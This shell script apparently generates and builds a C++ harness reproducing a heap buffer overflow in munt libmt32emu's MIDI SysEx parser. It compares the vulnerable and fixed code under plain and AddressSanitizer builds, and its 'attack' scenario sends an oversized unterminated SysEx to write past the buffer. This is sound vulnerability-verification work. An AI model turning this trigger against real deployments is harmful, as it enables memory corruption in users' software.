#!/bin/sh
# munt2shell direct-call harness (munt libmt32emu MidiStreamParser oversized
# SysEx heap write; GitHub issue #149, fix 1749f7f). Verbatim pinned upstream
# MidiStreamParserImpl implementation slices at vulnerable tag libmt32emu_2_8_3
# and fixed commit 1749f7f are included under #line control. Everything else
# is a declared stub: scalar types, receiver/reporter interfaces, Synth helper,
# and the driver. No libmt32emu build, synth, MIDI host, socket or wire.
set -eu
HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
PINS=$(CDPATH= cd -- "$HERE/../pins" && pwd)
mkdir -p "$HERE/evidence"

gen_driver() { # variant
    v=$1
    if [ "$v" = vuln ]; then lo=68; hi=295; tag=MidiStreamParser.cpp.vuln; f=$PINS/MidiStreamParser.cpp.vuln
    else                    lo=68; hi=299; tag=MidiStreamParser.cpp.fixed; f=$PINS/MidiStreamParser.cpp.fixed
    fi
    out="$HERE/driver-$v.cpp"
    {
        cat <<'HEADER'
/* Generated by harness/run.sh. Pinned upstream bytes are under #line;
   everything else is a declared stub. Do not edit this file by hand. */
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <new>

using Bit8u = uint8_t;
using Bit32u = uint32_t;
static const unsigned int MAX_STREAM_BUFFER_SIZE = 32768; /* globals.h:122,145 */
static const unsigned int SYSEX_BUFFER_SIZE = 1000;       /* globals.h:127,148 */
#define MT32EMU_EXPORT

namespace MT32Emu {

class Synth {
public:
    /* Stub: shortest short MIDI message is 3 bytes; only used by the
       parseShortMessageDataBytes path, not by the SysEx scenarios. */
    static Bit32u getShortMessageLength(Bit8u) { return 3; }
};

class MidiReceiver {
public:
    virtual void handleShortMessage(const Bit32u message) = 0;
    virtual void handleSysex(const Bit8u stream[], const Bit32u length) = 0;
    virtual void handleSystemRealtimeMessage(const Bit8u realtime) = 0;
protected:
    ~MidiReceiver() {}
};

class MidiReporter {
public:
    virtual void printDebug(const char *debugMessage) = 0;
protected:
    ~MidiReporter() {}
};

class MidiStreamParserImpl {
public:
    MidiStreamParserImpl(MidiReceiver &, MidiReporter &, Bit32u initialStreamBufferCapacity = SYSEX_BUFFER_SIZE);
    virtual ~MidiStreamParserImpl();
    void parseStream(const Bit8u *stream, Bit32u length);
    void processShortMessage(const Bit32u message);
private:
    Bit8u runningStatus;
    Bit8u *streamBuffer;
    Bit32u streamBufferCapacity;
    Bit32u streamBufferSize;
    MidiReceiver &midiReceiver;
    MidiReporter &midiReporter;
    void *reserved;
    bool checkStreamBufferCapacity(const bool preserveContent);
    bool processStatusByte(Bit8u &status);
    Bit32u parseShortMessageStatus(const Bit8u stream[]);
    Bit32u parseShortMessageDataBytes(const Bit8u stream[], Bit32u length);
    Bit32u parseSysex(const Bit8u stream[], const Bit32u length);
    Bit32u parseSysexFragment(const Bit8u stream[], const Bit32u length);
};

class MidiStreamParser : public MidiStreamParserImpl, protected MidiReceiver, protected MidiReporter {
public:
    explicit MidiStreamParser(Bit32u initialStreamBufferCapacity = SYSEX_BUFFER_SIZE);
};

} // namespace MT32Emu
using namespace MT32Emu;

HEADER
        printf '#line %d "%s"\n' "$lo" "$tag"
        awk -v lo="$lo" -v hi="$hi" 'NR>=lo && NR<=hi' "$f"
        cat <<'TAIL'

/* #line reset: only the slice above is pinned upstream bytes; the driver
   below is generated code, not attributed to the pinned file. */
#line 1 "driver-stub.cpp"

#ifndef ASAN_BUILD
/* Plain builds append a 0xa5 canary after every new[] allocation so chosen
   bytes can be read after the buffer boundary; real operator new[] has no
   such canary. ASan builds keep the real allocator to catch the first OOB. */
static void *g_last_alloc = nullptr;
static std::size_t g_last_size = 0;
void *operator new[](std::size_t n) {
    void *p = std::malloc(n + 16384);
    if (!p) std::abort();
    std::memset(static_cast<unsigned char *>(p) + n, 0xa5, 16384);
    g_last_alloc = p;
    g_last_size = n;
    return p;
}
void operator delete[](void *p) noexcept { std::free(p); }
void operator delete[](void *p, std::size_t) noexcept { std::free(p); }
#endif

class TestParser : public MT32Emu::MidiStreamParser {
public:
    int shortMessages = 0, sysexMessages = 0, realtimeMessages = 0, debugCalls = 0;
    Bit32u lastSysexLength = 0;
    using MT32Emu::MidiStreamParser::MidiStreamParser;
protected:
    void handleShortMessage(const Bit32u) override { ++shortMessages; }
    void handleSysex(const Bit8u[], const Bit32u length) override {
        ++sysexMessages; lastSysexLength = length;
    }
    void handleSystemRealtimeMessage(const Bit8u) override { ++realtimeMessages; }
    void printDebug(const char *) override { ++debugCalls; }
};

int main(int argc, char **argv) {
    const char *sc = argc > 1 ? argv[1] : "baseline";
    Bit32u dataLen = 0;
    bool terminated = false;
    if (!std::strcmp(sc, "baseline"))        { dataLen = 100; terminated = true; }
    else if (!std::strcmp(sc, "fragment"))   { dataLen = 100; terminated = false; }
    else if (!std::strcmp(sc, "attack"))     { dataLen = 40000; terminated = false; }
    else { std::fprintf(stderr, "unknown scenario %s\n", sc); return 2; }

    /* The input block is malloc'd so it does not disturb the plain-build
       canary allocator's last-allocation pointer. */
    Bit8u *in = static_cast<Bit8u *>(std::malloc(1u + dataLen + 1u));
    if (!in) return 2;
    in[0] = 0xF0;
    std::memset(in + 1, 0x5a, dataLen);
    if (terminated) in[1 + dataLen] = 0xF7;
    Bit32u total = 1u + dataLen + (terminated ? 1u : 0u);

    TestParser p;
    p.parseStream(in, total);
    unsigned char *buf = nullptr;
#ifndef ASAN_BUILD
    buf = static_cast<unsigned char *>(g_last_alloc);
#endif
    std::printf("scenario=%s variant=%s total=%u sysex=%u short=%u realtime=%u debug=%u lastlen=%u",
        sc,
#if VULN_BUILD
        "vuln",
#else
        "fixed",
#endif
        total, p.sysexMessages, p.shortMessages, p.realtimeMessages, p.debugCalls, p.lastSysexLength);
#ifndef ASAN_BUILD
    if (buf && g_last_size >= 32768) {
        std::printf(" b32768=%02x b32769=%02x b32770=%02x b32771=%02x",
            buf[32768], buf[32769], buf[32770], buf[32771]);
    }
#endif
    std::printf("\n");
    std::free(in);
    return 0;
}
TAIL
    } > "$out"
}

gen_driver vuln
gen_driver fixed

build() { # cc variant plain/asan suffix
    cc=$1; v=$2; mode=$3; exe=$4
    cxx=$cc
    [ "$cc" = gcc ] && cxx=g++
    [ "$cc" = clang ] && cxx=clang++
    flags="-std=c++11 -O1 -g -DVULN_BUILD=1"
    [ "$v" = fixed ] && flags="-std=c++11 -O1 -g -DVULN_BUILD=0"
    [ "$mode" = asan ] && flags="$flags -DASAN_BUILD -fsanitize=address -fno-omit-frame-pointer"
    # shellcheck disable=SC2086
    "$cxx" $flags "$HERE/driver-$v.cpp" -o "$HERE/$exe"
}

for cc in gcc clang; do
    build "$cc" vuln plain  "$cc-vuln-plain"
    build "$cc" vuln asan   "$cc-vuln-asan"
    build "$cc" fixed plain "$cc-fixed-plain"
    build "$cc" fixed asan  "$cc-fixed-asan"
done
echo "built 8 binaries in $HERE"
